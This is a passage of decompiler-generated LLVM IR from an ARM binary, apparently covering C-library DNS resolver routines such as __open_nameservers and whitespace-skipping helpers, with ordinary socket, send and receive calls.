  %v2_1902c = sub i32 %tmp159, %stack_var_-452.061
  %v1_19030 = add i32 %v2_1902c, -1
  store i32 %v1_19030, i32* %r3.global-to-local, align 4
  %v1_19034 = add i32 %v3_19028, 4
  %v2_19038 = mul i32 %v1_19034, %v1_19030
  store i32 %v2_19038, i32* %r1.global-to-local, align 4
  %v1_1903c = add i32 %v0_18fe4, 32
  %v2_1903c = inttoptr i32 %v1_1903c to i32*
  %v3_1903c = load i32, i32* %v2_1903c, align 4
  %v3_19040 = icmp uge i32 %v2_19038, %v3_1903c
  store i1 %v3_19040, i1* %cpsr_c.global-to-local, align 1
  %v2_19044 = add i32 %v0_18fe4, 36
  %v3_19044 = inttoptr i32 %v2_19044 to i32*
  store i32 %v1_19030, i32* %v3_19044, align 4
  %tmp286 = icmp ugt i32 %v2_19038, %v3_1903c
  br i1 %tmp286, label %dec_label_pc_190dc, label %dec_label_pc_1904c

dec_label_pc_1904c:                               ; preds = %dec_label_pc_19020
  store i32 0, i32* @r7, align 4
  %v1_19054 = load i32, i32* @fp, align 4
  %v2_19054 = add i32 %v1_19054, 36
  %v3_19054 = inttoptr i32 %v2_19054 to i32*
  store i32 0, i32* %v3_19054, align 4
  br label %dec_label_pc_190b4

dec_label_pc_1905c:                               ; preds = %dec_label_pc_18fb4
  store i32 %v2_18ef4, i32* @r0, align 4
  %v0_19060 = call i32 @free()
  store i32 %v5_18f48, i32* %r3.global-to-local, align 4
  store i32 %v0_189e4, i32* @ip, align 4
  %v3_1906c = icmp uge i32 %v5_18f48, %v0_189e4
  store i1 %v3_1906c, i1* %cpsr_c.global-to-local, align 1
  %v9_1906c = icmp eq i32 %v5_18f48, %v0_189e4
  br i1 %v9_1906c, label %dec_label_pc_19074, label %dec_label_pc_190b4

dec_label_pc_19074:                               ; preds = %dec_label_pc_1905c
  %v0_19074 = load i32, i32* @fp, align 4
  %v1_19074 = add i32 %v0_19074, 16
  %v2_19074 = inttoptr i32 %v1_19074 to i32*
  %v3_19074 = load i32, i32* %v2_19074, align 4
  store i32 %v3_19074, i32* %r1.global-to-local, align 4
  store i32 %v5_18f40, i32* %r3.global-to-local, align 4
  %v3_1907c = icmp uge i32 %v3_19074, %v5_18f40
  store i1 %v3_1907c, i1* %cpsr_c.global-to-local, align 1
  %v9_1907c = icmp eq i32 %v3_19074, %v5_18f40
  br i1 %v9_1907c, label %dec_label_pc_19090, label %dec_label_pc_19084

dec_label_pc_19084:                               ; preds = %dec_label_pc_19074
  %v1_19084 = inttoptr i32 %v0_19074 to i32*
  %v2_19084 = load i32, i32* %v1_19084, align 4
  store i32 %v2_19084, i32* @r0, align 4
  %v0_19088 = call i32 @free()
  br label %dec_label_pc_19104

dec_label_pc_19090:                               ; preds = %dec_label_pc_19074
  %v1_19090 = add i32 %v0_19074, 36
  %v2_19090 = inttoptr i32 %v1_19090 to i32*
  %v3_19090 = load i32, i32* %v2_19090, align 4
  %v1_19094 = add i32 %v0_19074, 28
  %v2_19094 = inttoptr i32 %v1_19094 to i32*
  %v3_19094 = load i32, i32* %v2_19094, align 4
  store i32 %v3_19094, i32* @r3, align 4
  %v3_19098 = mul i32 %v3_19090, %v5_18f40
  %v4_19098 = add i32 %v3_19094, %v3_19098
  store i32 %v4_19098, i32* @r0, align 4
  store i32 %v5_18f40, i32* @r2, align 4
  store i32 %v1_18f60, i32* @r1, align 4
  %v0_190a4 = call i32 @memcpy()
  %v0_190a8 = load i32, i32* @fp, align 4
  %v1_190a8 = add i32 %v0_190a8, 36
  %v2_190a8 = inttoptr i32 %v1_190a8 to i32*
  %v3_190a8 = load i32, i32* %v2_190a8, align 4
  %v1_190ac = add i32 %v3_190a8, 1
  store i32 %v1_190ac, i32* %r3.global-to-local, align 4
  store i32 %v1_190ac, i32* %v2_190a8, align 4
  br label %dec_label_pc_190b4

dec_label_pc_190b4:                               ; preds = %bb228, %dec_label_pc_1905c, %dec_label_pc_1904c, %dec_label_pc_19090
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_19090 ], [ 0, %dec_label_pc_1905c ], [ 0, %dec_label_pc_1904c ], [ 1, %bb228 ]
  %v1_190bc = load i32, i32* @r4, align 4
  %v1_190c0 = add nuw nsw i32 %stack_var_-452.061, 1
  store i32 %v1_190c0, i32* %r1.global-to-local, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  %v3_190d4 = icmp uge i32 %v1_190c0, %tmp159
  store i1 %v3_190d4, i1* %cpsr_c.global-to-local, align 1
  %v5_190d8 = icmp slt i32 %v1_190c0, %tmp159
  br i1 %v5_190d8, label %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge, label %dec_label_pc_190dc

dec_label_pc_190b4.dec_label_pc_18eac_crit_edge:  ; preds = %dec_label_pc_190b4
  %v2_190bc = add i32 %v1_190bc, %stack_var_-460.364
  %v0_18eb0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_18eac

dec_label_pc_190dc:                               ; preds = %dec_label_pc_18fa4, %dec_label_pc_18e88, %dec_label_pc_190b4, %dec_label_pc_18ff0, %dec_label_pc_19020, %bb227
  %v1_190e0 = call i32 @__GI_close(i32 %v3_18cb4)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_190e8 = icmp eq i32 %arg3, 0
  br i1 %v2_190e8, label %.thread21, label %bb230

bb230:                                            ; preds = %dec_label_pc_190dc
  %v1_190f0 = load i32, i32* @sl, align 4
  %v3_190ec = inttoptr i32 %arg3 to i32*
  store i32 %v1_190f0, i32* %v3_190ec, align 4
  br label %bb231

.thread21:                                        ; preds = %dec_label_pc_190dc
  br label %bb231

bb231:                                            ; preds = %bb230, %.thread21
  store i32 ptrtoint (i32* @global_var_190f8.940 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_190e8, i32 ptrtoint (i32* @global_var_136fc.598 to i32))
  store i32 %v1_18a2c, i32* @r0, align 4
  %v0_190fc = call i32 @free()
  br label %dec_label_pc_1916c

dec_label_pc_19104:                               ; preds = %thread-pre-split, %dec_label_pc_18d00, %dec_label_pc_18e60, %dec_label_pc_18e58, %dec_label_pc_18e08, %dec_label_pc_18e14, %dec_label_pc_18e20thread-pre-split, %thread-pre-split.thread, %dec_label_pc_18dd8, %dec_label_pc_18fa4, %dec_label_pc_18f98, %dec_label_pc_18cc4, %dec_label_pc_18ca4, %dec_label_pc_19084
  %v1_19108 = add i32 %v0_18bc8, 1
  store i32 %v1_19108, i32* @r5, align 4
  br label %dec_label_pc_19114

dec_label_pc_19114:                               ; preds = %.thread7, %dec_label_pc_19104
  %storemerge22 = phi i32 [ -1, %dec_label_pc_19104 ], [ %v7_18dc4, %.thread7 ]
  %stack_var_-468.2 = phi i32 [ %v1_19108, %dec_label_pc_19104 ], [ %v0_18bc8, %.thread7 ]
  store i32 %storemerge22, i32* @sb, align 4
  %v1_19118 = add i32 %stack_var_-476.1, -1
  store i32 %v1_19118, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_19118, 1
  br i1 %tmp232, label %dec_label_pc_19134, label %dec_label_pc_18acc

dec_label_pc_1912c:                               ; preds = %dec_label_pc_18c78, %bb218, %bb213, %.thread5, %dec_label_pc_18a48
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_19134

dec_label_pc_19134:                               ; preds = %dec_label_pc_19114, %.thread132, %dec_label_pc_1912c
  %stack_var_-472.1 = phi i32 [ %v1_18a2c, %dec_label_pc_1912c ], [ 0, %.thread132 ], [ %v1_18a2c, %dec_label_pc_19114 ]
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_1912c ], [ -1, %.thread132 ], [ %v3_18cb4, %dec_label_pc_19114 ]
  %v0_19134 = call i32 @__GI___h_errno_location()
  store i32 %stack_var_-488.2, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_19140 = icmp eq i32 %stack_var_-488.2, -1
  store i1 %v2_19140, i1* %cpsr_c.global-to-local, align 1
  %v7_19140 = icmp eq i32 %stack_var_-488.2, -1
  %v2_19144 = inttoptr i32 %v0_19134 to i32*
  store i32 -1, i32* %v2_19144, align 4
  br i1 %v7_19140, label %dec_label_pc_19154, label %dec_label_pc_1914c

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19134, %dec_label_pc_18e00
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19134 ], [ %v1_18a2c, %dec_label_pc_18e00 ]
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_19134 ], [ %v3_18cb4, %dec_label_pc_18e00 ]
  %v1_19150 = call i32 @__GI_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_19154

dec_label_pc_19154:                               ; preds = %dec_label_pc_19134, %dec_label_pc_1914c
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_19134 ], [ %stack_var_-472.2, %dec_label_pc_1914c ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_19158 = call i32 @free()
  %v0_1915c = load i32, i32* @sl, align 4
  store i32 %v0_1915c, i32* @r0, align 4
  %v0_19160 = call i32 @free()
  br label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %bb231, %dec_label_pc_19154
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_19154 ], [ %v5_18d3c, %bb231 ]
  store i32 %v3_189d0, i32* @r4, align 4
  store i32 %v6_189d0, i32* @r5, align 4
  store i32 %v9_189d0, i32* @r6, align 4
  store i32 %v12_189d0, i32* @r7, align 4
  store i32 %v15_189d0, i32* @r8, align 4
  store i32 %v18_189d0, i32* @sb, align 4
  store i32 %v21_189d0, i32* @sl, align 4
  store i32 %v24_189d0, i32* @fp, align 4
  store i32 %v27_189d0, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-488.2, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_19118, { 1, 2, 0 }
  uselistorder i32 %v1_190c0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_19074, { 2, 1, 0, 3 }
  uselistorder i32 %v1_19030, { 1, 0, 2 }
  uselistorder i32 %v2_18f68, { 1, 0 }
  uselistorder i32 %v5_18f40, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_18f00, { 3, 4, 0, 5, 6, 1, 2, 7, 8, 9, 10 }
  uselistorder i32 %v2_18efc, { 1, 0 }
  uselistorder i32 %v2_18ee0, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_18edc, { 1, 0 }
  uselistorder i32 %v1_18ed8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.061, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.364, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32 %v0_18e58, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_18e34, { 1, 0 }
  uselistorder i32 %v3_18e28, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18e28, { 0, 2, 1 }
  uselistorder i32 %v2_18e18, { 0, 2, 1 }
  uselistorder i1 %v7_18d4c, { 1, 0 }
  uselistorder i32 %v1_18d4c, { 1, 0 }
  uselistorder i32 %v0_18d4c, { 1, 0 }
  uselistorder i32 %v5_18d3c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v3_18cb4, { 1, 0, 2, 9, 7, 6, 5, 8, 4, 10, 11, 3 }
  uselistorder i32 %v6_18c6c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18bf8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_18be0, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 %v1_18bd4, { 1, 0 }
  uselistorder i32 %v0_18bc8, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-464.1, { 1, 0 }
  uselistorder i32 %v0_18b80, { 1, 0, 2, 3, 4 }
  uselistorder i1 %v7_18ad0, { 1, 0 }
  uselistorder i32 %v1_18ad4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-468.0, { 0, 2, 1 }
  uselistorder i32 %v2_18e90, { 1, 0, 2 }
  uselistorder i32 %v1_18da0, { 2, 0, 1 }
  uselistorder i32 %v2_18c28, { 1, 0, 2 }
  uselistorder i32 %v2_18c00, { 1, 0 }
  uselistorder i32 %v0_18a48, { 1, 0, 2 }
  uselistorder i32 %v1_18a2c, { 7, 0, 3, 6, 4, 8, 1, 9, 2, 5, 10, 11 }
  uselistorder i32 %v3_189f8, { 5, 1, 3, 2, 4, 0, 6 }
  uselistorder i32 %v0_189e4, { 10, 9, 8, 7, 6, 5, 2, 11, 0, 1, 4, 3 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp159, { 3, 8, 7, 0, 6, 2, 4, 1, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 2, 26, 27, 1, 54, 28, 29, 30, 31, 32, 33, 34, 40, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 33, 29, 30, 31, 32, 34, 35, 36, 9, 10, 11, 12, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 10, 11, 12, 13, 14, 15, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 30, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 21, 29, 3, 31, 32, 33, 34, 35, 2, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32)* @__GI_close, { 12, 11, 13, 18, 17, 16, 15, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 23, { 2, 0, 1 }
  uselistorder i32 -3, { 2, 0, 1, 3, 4 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__GI___h_errno_location, { 3, 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_recv, { 0, 4, 3, 2, 1 }
  uselistorder i32 64, { 2, 16, 0, 13, 9, 11, 4, 5, 6, 7, 1, 3, 14, 15, 10, 8, 12, 17 }
  uselistorder i32 1000, { 5, 3, 6, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 0, 7, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 17, { 1, 7, 0, 9, 8, 2, 3, 5, 4, 6 }
  uselistorder i32 76, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 2, 13, 14, 18, 19, 20, 21, 15, 16, 17, 3 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5, 6, 7 }
  uselistorder i32 29320, { 2, 0, 1, 3 }
  uselistorder i32 512, { 3, 9, 2, 10, 1, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1916c, { 1, 0 }
  uselistorder label %dec_label_pc_19154, { 1, 0 }
  uselistorder label %dec_label_pc_19134, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1912c, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_19114, { 1, 0 }
  uselistorder label %dec_label_pc_19104, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb231, { 1, 0 }
  uselistorder label %dec_label_pc_190dc, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_190b4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1900c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f98, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_18eac, { 1, 0 }
  uselistorder label %dec_label_pc_18e58, { 1, 0 }
  uselistorder label %dec_label_pc_18e28, { 1, 0 }
  uselistorder label %dec_label_pc_18e00, { 1, 0 }
  uselistorder label %dec_label_pc_18d4c, { 1, 0, 2 }
  uselistorder label %bb218, { 1, 0 }
  uselistorder label %dec_label_pc_18ba8, { 1, 0 }
  uselistorder label %dec_label_pc_18b6c, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1917c:
  %v0_1917c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1917c, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_1917c
  %v2_19188 = load i32, i32* @r8, align 4
  %v2_19198 = load i32, i32* @r6, align 4
  %v3_191ac = mul i32 %v2_19198, %v2_19188
  %v8_191b0 = shl i32 %v2_19188, %v3_191ac
  %v9_191b0 = and i32 %v8_191b0, %v3_191ac
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_1917c, %bb
  %v10_191b4 = phi i32 [ %arg1, %dec_label_pc_1917c ], [ %v9_191b0, %bb ]
  ret i32 %v10_191b4

; uselistorder directives
  uselistorder i32 %v2_19188, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 3528, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19210 = load i32, i32* @r4, align 4
  store i32 %v3_19210, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @ip, align 4
  store i32 3528, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_19220.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_192209 = inttoptr i32 %v0_19220.pre to i8*
  %v2_1922010 = load i8, i8* %v1_192209, align 1
  %v2_1922412 = icmp eq i8 %v2_1922010, 0
  store i1 %v2_1922412, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1922412, label %dec_label_pc_19254, label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %entry, %bb8.dec_label_pc_19230_crit_edge
  %v1_19230 = phi i32 [ %v1_19230.pre, %bb8.dec_label_pc_19230_crit_edge ], [ 3528, %entry ]
  %v0_19230 = phi i32 [ %v0_19230.pre, %bb8.dec_label_pc_19230_crit_edge ], [ ptrtoint (i32* @global_var_268d4.582 to i32), %entry ]
  %v2_1922016 = phi i8 [ %v2_19220, %bb8.dec_label_pc_19230_crit_edge ], [ %v2_1922010, %entry ]
  %v2_1922817.in.in = phi i8 [ %v2_19220, %bb8.dec_label_pc_19230_crit_edge ], [ %v2_1922010, %entry ]
  %v1_1922015 = phi i8* [ %v1_19220, %bb8.dec_label_pc_19230_crit_edge ], [ %v1_192209, %entry ]
  %v2_1924814 = phi i32 [ %v2_1924c, %bb8.dec_label_pc_19230_crit_edge ], [ %v0_19220.pre, %entry ]
  %v2_1922817.in = zext i8 %v2_1922817.in.in to i32
  %v2_1922817 = mul nuw nsw i32 %v2_1922817.in, 2
  %v2_19230 = add i32 %v1_19230, %v0_19230
  %v3_19230 = inttoptr i32 %v2_19230 to i32*
  %v4_19230 = load i32, i32* %v3_19230, align 4
  %v2_19234 = add i32 %v4_19230, %v2_1922817
  %v3_19234 = inttoptr i32 %v2_19234 to i16*
  %v4_19234 = load i16, i16* %v3_19234, align 2
  %v1_19238 = and i16 %v4_19234, 32
  %v2_19238 = icmp eq i16 %v1_19238, 0
  store i1 %v2_19238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19238, label %dec_label_pc_19254, label %dec_label_pc_19240

dec_label_pc_19240:                               ; preds = %dec_label_pc_19230
  %v7_19240 = icmp eq i8 %v2_1922016, 35
  br i1 %v7_19240, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_19240
  %v8_19244 = icmp eq i8 %v2_1922016, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_19240, %bb
  %storemerge = phi i1 [ %v8_19244, %bb ], [ %v7_19240, %dec_label_pc_19240 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_19248 = load i32, i32* %lr.global-to-local, align 4
  %v1_19248 = trunc i32 %v0_19248 to i8
  store i8 %v1_19248, i8* %v1_1922015, align 1
  %v0_1924c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_19258.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_1924c, label %dec_label_pc_19254, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1924c = add i32 %v1_19258.pre, 1
  store i32 %v2_1924c, i32* %r0.global-to-local, align 4
  %v1_19220 = inttoptr i32 %v2_1924c to i8*
  %v2_19220 = load i8, i8* %v1_19220, align 1
  %v2_19224 = icmp eq i8 %v2_19220, 0
  store i1 %v2_19224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19224, label %dec_label_pc_19254, label %bb8.dec_label_pc_19230_crit_edge

bb8.dec_label_pc_19230_crit_edge:                 ; preds = %bb8
  %v0_19230.pre = load i32, i32* @ip, align 4
  %v1_19230.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19230

dec_label_pc_19254:                               ; preds = %bb8, %dec_label_pc_19230, %bb7, %entry
  %v1_19258 = phi i32 [ %v0_19220.pre, %entry ], [ %v1_19258.pre, %bb7 ], [ %v2_1924814, %dec_label_pc_19230 ], [ %v2_1924c, %bb8 ]
  %v2_19254 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19254, i32* @r4, align 4
  ret i32 %v1_19258

; uselistorder directives
  uselistorder i8 %v2_19220, { 2, 1, 0 }
  uselistorder i8* %v1_19220, { 1, 0 }
  uselistorder i32 %v2_1924c, { 0, 2, 3, 1 }
  uselistorder i1 %v2_19238, { 1, 0 }
  uselistorder i8 %v2_1922016, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 3528, { 0, 3, 4, 5, 2, 1, 6, 7 }
  uselistorder label %dec_label_pc_19254, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_19230, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19264 = load i32, i32* @r4, align 4
  store i32 %v3_19264, i32* %stack_var_-36, align 4
  %v15_19264 = load i32, i32* @r8, align 4
  %v18_19264 = load i32, i32* @sb, align 4
  %v21_19264 = load i32, i32* @sl, align 4
  %v24_19264 = load i32, i32* @fp, align 4
  %v27_19264 = load i32, i32* @lr, align 4
  store i32 30352, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  %v4_19274 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 30352) to i32*), align 4
  store i32 %v4_19274, i32* @r4, align 4
  %v2_19278 = icmp eq i32 %v4_19274, 0
  br i1 %v2_19278, label %dec_label_pc_19284, label %dec_label_pc_192b4

dec_label_pc_19284:                               ; preds = %entry
  %v2_19288 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_19288, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32932), i32* %r0.global-to-local, align 4
  %v2_19290 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32932), i32 %v2_19288)
  store i32 %v2_19290, i32* %r0.global-to-local, align 4
  %v2_19294 = icmp eq i32 %v2_19290, 0
  %v1_19298 = load i32, i32* @r4, align 4
  %.v1_19298 = select i1 %v2_19294, i32 %tmp38, i32 %v1_19298
  store i32 29348, i32* %r1.global-to-local, align 4
  store i32 %.v1_19298, i32* %r2.global-to-local, align 4
  %v0_192a4 = load i32, i32* @r5, align 4
  %v2_192a4 = add i32 %v0_192a4, 29348
  %v3_192a4 = inttoptr i32 %v2_192a4 to i32*
  %v4_192a4 = load i32, i32* %v3_192a4, align 4
  store i32 %v4_192a4, i32* %r3.global-to-local, align 4
  %v9_192a8 = icmp eq i32 %v4_192a4, %.v1_19298
  br i1 %v9_192a8, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_19284
  store i32 %.v1_19298, i32* %v3_192a4, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_19284, %bb
  store i32 103092, i32* @lr, align 4
  %v1_192b0 = xor i1 %v9_192a8, true
  call void @__pseudo_cond_branch(i1 %v1_192b0, i32 ptrtoint (i32* @global_var_196c0.949 to i32))
  %v0_192b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192b4

dec_label_pc_192b4:                               ; preds = %entry, %bb58
  %v2_192cc = phi i32 [ ptrtoint (i32* @global_var_268d4.582 to i32), %entry ], [ %v0_192b8.pre, %bb58 ]
  store i32 30364, i32* %r3.global-to-local, align 4
  %v2_192b8 = add i32 %v2_192cc, 30364
  %v3_192b8 = inttoptr i32 %v2_192b8 to i32*
  %v4_192b8 = load i32, i32* %v3_192b8, align 4
  store i32 %v4_192b8, i32* %r3.global-to-local, align 4
  %v2_192bc = icmp eq i32 %v4_192b8, 0
  br i1 %v2_192bc, label %dec_label_pc_192c4, label %dec_label_pc_19658

dec_label_pc_192c4:                               ; preds = %dec_label_pc_192b4
  %v4_192cc = add i32 %v2_192cc, 4126
  %v5_192cc = inttoptr i32 %v4_192cc to i8*
  store i8 5, i8* %v5_192cc, align 1
  store i32 -32932, i32* %r0.global-to-local, align 4
  store i32 4127, i32* %r3.global-to-local, align 4
  store i32 -33888, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_192e0 = load i32, i32* @r5, align 4
  %v4_192e0 = add i32 %v2_192e0, 4127
  %v5_192e0 = inttoptr i32 %v4_192e0 to i8*
  store i8 3, i8* %v5_192e0, align 1
  %v0_192e4 = load i32, i32* @r5, align 4
  %v1_192e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_192e4 = add i32 %v1_192e4, %v0_192e4
  store i32 %v2_192e4, i32* @r0, align 4
  %v1_192e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_192e8 = add i32 %v1_192e8, %v0_192e4
  store i32 %v2_192e8, i32* @r1, align 4
  %v2_192ec = call i32 @__GI_fopen(i32 %v2_192e4, i32 %v2_192e8)
  store i32 %v2_192ec, i32* %r0.global-to-local, align 4
  store i32 %v2_192ec, i32* @fp, align 4
  %v2_192f0 = icmp eq i32 %v2_192ec, 0
  br i1 %v2_192f0, label %dec_label_pc_1957c, label %dec_label_pc_19524

dec_label_pc_192fc:                               ; preds = %dec_label_pc_19524, %dec_label_pc_19558.backedge
  store i32 %v2_19558, i32* %r0.global-to-local, align 4
  %v2_19300 = call i32 @skip_and_NUL_space(i8* %v1_19300)
  store i32 %v2_19300, i32* %r0.global-to-local, align 4
  store i32 %v2_19300, i32* @r4, align 4
  %v0_19308 = call i32 @skip_nospace()
  store i32 %v0_19308, i32* %r0.global-to-local, align 4
  %v1_1930c = inttoptr i32 %v0_19308 to i8*
  %v2_1930c = call i32 @skip_and_NUL_space(i8* %v1_1930c)
  store i32 %v2_19528, i32* @r1, align 4
  store i32 %v2_1930c, i32* @r7, align 4
  %v0_19318 = load i32, i32* @r4, align 4
  store i32 %v0_19318, i32* %r0.global-to-local, align 4
  %v2_1931c = inttoptr i32 %v0_19318 to i8*
  %v3_1931c = call i32 @__GI_strcoll(i8* %v2_1931c, i32 %v2_19528)
  store i32 %v3_1931c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_1931c, 16777216
